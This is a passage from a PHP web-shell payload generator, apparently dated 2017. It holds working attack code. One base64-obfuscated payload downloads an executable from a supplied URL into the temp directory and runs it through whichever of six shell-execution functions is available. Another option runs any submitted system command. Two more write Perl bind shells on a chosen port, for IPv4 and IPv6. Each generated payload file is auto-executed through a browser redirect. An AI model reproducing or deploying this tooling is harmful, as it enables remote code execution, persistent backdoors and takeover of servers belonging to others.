        $file = d("ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRZSlRkbj1AaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsKICAgICAgaWYoIWVtcHR5KCRZSlRkbikpewogICAgICAgICRZSlRkbj1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRZSlRkbik7CiAgICAgICAgJFlKVGRuPWV4cGxvZGUoJywnLCAkWUpUZG4pOwogICAgICAgICRZSlRkbj1hcnJheV9tYXAoJ3RyaW0nLCAkWUpUZG4pOwogICAgICB9ZWxzZXsKICAgICAgICAkWUpUZG49YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCdzeXNfZ2V0X3RlbXBfZGlyJykpIHsKICAgICAgZnVuY3Rpb24gc3lzX2dldF90ZW1wX2RpcigpIHsKICAgICAgICBpZiAoIWVtcHR5KCRfRU5WWydUTVAnXSkpIHsgcmV0dXJuIHJlYWxwYXRoKCRfRU5WWydUTVAnXSk7IH0KICAgICAgICBpZiAoIWVtcHR5KCRfRU5WWydUTVBESVInXSkpIHsgcmV0dXJuIHJlYWxwYXRoKCRfRU5WWydUTVBESVInXSk7IH0KICAgICAgICBpZiAoIWVtcHR5KCRfRU5WWydURU1QJ10pKSB7IHJldHVybiByZWFscGF0aCgkX0VOVlsnVEVNUCddKTsgfQogICAgICAgICR0ZW1wZmlsZT10ZW1wbmFtKHVuaXFpZChyYW5kKCksVFJVRSksJycpOwogICAgICAgIGlmIChmaWxlX2V4aXN0cygkdGVtcGZpbGUpKSB7CiAgICAgICAgICBAdW5saW5rKCR0ZW1wZmlsZSk7CiAgICAgICAgICByZXR1cm4gcmVhbHBhdGgoZGlybmFtZSgkdGVtcGZpbGUpKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgIH0KICAgIH0KICAgICRmbmFtZSA9IHN5c19nZXRfdGVtcF9kaXIoKSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAicnFnZ0Z2Y0suZXhlIjsKICAgICRmZF9pbiA9IGZvcGVuKCJ4bG9uY2F0dXJsIiwgInJiIik7CiAgICBpZiAoJGZkX2luID09PSBmYWxzZSkgeyBkaWUoKTsgfQogICAgJGZkX291dCA9IGZvcGVuKCRmbmFtZSwgIndiIik7CiAgICBpZiAoJGZkX291dCA9PT0gZmFsc2UpIHsgZGllKCk7IH0KICAgIHdoaWxlICghZmVvZigkZmRfaW4pKSB7CiAgICAgIGZ3cml0ZSgkZmRfb3V0LCBmcmVhZCgkZmRfaW4sIDgxOTIpKTsKICAgIH0KICAgIGZjbG9zZSgkZmRfaW4pOwogICAgZmNsb3NlKCRmZF9vdXQpOwogICAgY2htb2QoJGZuYW1lLCAwNzc3KTsKICAgICRjID0gJGZuYW1lOwogICAgCiAgICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicgKSkgewogICAgICAgICRjPSRjLiIgMj4mMVxuIjsKICAgICAgfQogICAgICAkVkhpZD0naXNfY2FsbGFibGUnOwogICAgICAkWm5XYm5WPSdpbl9hcnJheSc7CiAgICAgIAogICAgICBpZigkVkhpZCgncG9wZW4nKWFuZCEkWm5XYm5WKCdwb3BlbicsJFlKVGRuKSl7CiAgICAgICAgJGZwPXBvcGVuKCRjLCdyJyk7CiAgICAgICAgJGZMSWVyPU5VTEw7CiAgICAgICAgaWYoaXNfcmVzb3VyY2UoJGZwKSl7CiAgICAgICAgICB3aGlsZSghZmVvZigkZnApKXsKICAgICAgICAgICAgJGZMSWVyLj1mcmVhZCgkZnAsMTAyNCk7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIEBwY2xvc2UoJGZwKTsKICAgICAgfWVsc2UKICAgICAgaWYoJFZIaWQoJ3Byb2Nfb3BlbicpYW5kISRabldiblYoJ3Byb2Nfb3BlbicsJFlKVGRuKSl7CiAgICAgICAgJGhhbmRsZT1wcm9jX29wZW4oJGMsYXJyYXkoYXJyYXkocGlwZSwncicpLGFycmF5KHBpcGUsJ3cnKSxhcnJheShwaXBlLCd3JykpLCRwaXBlcyk7CiAgICAgICAgJGZMSWVyPU5VTEw7CiAgICAgICAgd2hpbGUoIWZlb2YoJHBpcGVzWzFdKSl7CiAgICAgICAgICAkZkxJZXIuPWZyZWFkKCRwaXBlc1sxXSwxMDI0KTsKICAgICAgICB9CiAgICAgICAgQHByb2NfY2xvc2UoJGhhbmRsZSk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCRWSGlkKCdzaGVsbF9leGVjJylhbmQhJFpuV2JuVignc2hlbGxfZXhlYycsJFlKVGRuKSl7CiAgICAgICAgJGZMSWVyPXNoZWxsX2V4ZWMoJGMpOwogICAgICB9ZWxzZQogICAgICBpZigkVkhpZCgnc3lzdGVtJylhbmQhJFpuV2JuVignc3lzdGVtJywkWUpUZG4pKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHN5c3RlbSgkYyk7CiAgICAgICAgJGZMSWVyPW9iX2dldF9jb250ZW50cygpOwogICAgICAgIG9iX2VuZF9jbGVhbigpOwogICAgICB9ZWxzZQogICAgICBpZigkVkhpZCgncGFzc3RocnUnKWFuZCEkWm5XYm5WKCdwYXNzdGhydScsJFlKVGRuKSl7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBwYXNzdGhydSgkYyk7CiAgICAgICAgJGZMSWVyPW9iX2dldF9jb250ZW50cygpOwogICAgICAgIG9iX2VuZF9jbGVhbigpOwogICAgICB9ZWxzZQogICAgICBpZigkVkhpZCgnZXhlYycpYW5kISRabldiblYoJ2V4ZWMnLCRZSlRkbikpewogICAgICAgICRmTEllcj1hcnJheSgpOwogICAgICAgIGV4ZWMoJGMsJGZMSWVyKTsKICAgICAgICAkZkxJZXI9am9pbihjaHIoMTApLCRmTEllcikuY2hyKDEwKTsKICAgICAgfWVsc2UKICAgICAgewogICAgICAgICRmTEllcj0wOwogICAgICB9CiAgICAKICAgIEB1bmxpbmsoJGZuYW1lKTsK");
        $file = str_replace('xloncaturl', $url, $file);
        $filename = PREFIX.mt_rand(1,1000).SUFFIX;
        if(file_put_contents($filename, $file)) {
            echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
        }
    }
  ?><form method="POST"><?php
  fv_inputtext("URL:", "url", "Type URL");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
  }
  if($payload == "php/exec") {
    if(@checkvar($_POST['syseval']) === TRUE) {
        $eval = system($_POST['syseval']);
        echo "<script>alert('Payload is being executed');";
        echo $eval;
    }
  ?><form method="POST"><?php
  fv_inputtext("Command:", "syseval", "Type command");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
  }
 if($payload == "php/bind_perl") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $system = base64_encode("perl -MIO -e '\$p=fork();exit,if\$p;\$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;\$~->fdopen(\$c,w);STDIN->fdopen(\$c,r);system\$_ while<>'");
    $file = "<?php system(base64_decode(\"{$system}\")); ?>";
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
 if($payload == "php/bind_perl_ipv6") {
  if(@checkvar($_POST['bp1_rport']) === TRUE) {
    $port = $_POST['bp1_rport'];
    $system = base64_encode("perl -MIO -e '\$p=fork();exit,if\$p;\$c=new IO::Socket::INET6(LocalPort,{$port},Reuse,1,Listen)->accept;\$~->fdopen(\$c,w);STDIN >fdopen(\$c,r);system\$_ while<>'");
    $file = "<?php system(base64_decode(\"{$system}\")); ?>";
    $file = str_replace('xloncatport', $port, $file);
    $filename = PREFIX.mt_rand(1,1000).SUFFIX;
    if(file_put_contents($filename, $file)) {
        echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
    }
  }
  ?><form method="POST"><?php
  fv_inputtext("RPORT:", "bp1_rport", "Type RPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
 }
}
?>
<center><br><br>Copyright &copy; <b>P4kL0nc4t</b> 2017<br><br></center>
</div>
</body>
</html>
<?php
function fv_inputtext($label, $name, $placeholder) { $x = "<div class=\"form-group\"><label>{$label}</label><input class=\"form-control\" type=\"text\" name=\"{$name}\" placeholder=\"{$placeholder}\"></div>"; echo $x; }
function checkvar($x) { if(!empty($x) && isset($x)) { return true; } else { return false; } }
function submitbutton($x) { echo "<button class=\"btn btn-primary\" type=\"submit\">{$x}</button>"; }
function d($x) { return base64_decode($x); }
function create_href($x) { echo "<a href=\"{$x}\">{$x}</a>"; }
function c_option($x) { echo "<option value=\"{$x}\">{$x}</option>"; }
function c_inputhidden($x, $y) { echo "<input type=\"hidden\" name=\"{$x}\" value=\"{$y}\">"; }
?>
